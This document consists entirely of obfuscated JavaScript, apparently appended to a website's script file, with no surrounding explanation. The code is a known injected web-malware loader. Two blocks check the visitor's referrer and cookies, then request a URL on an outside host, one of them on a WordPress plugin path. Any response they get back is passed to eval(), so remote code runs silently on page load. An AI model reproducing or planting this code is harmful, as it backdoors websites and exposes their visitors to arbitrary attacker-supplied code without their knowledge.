;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//ikokasdev.com/grayphon/wp-content/plugins/advanced-custom-fields/assets/inc/datepicker/images/images.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}};if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};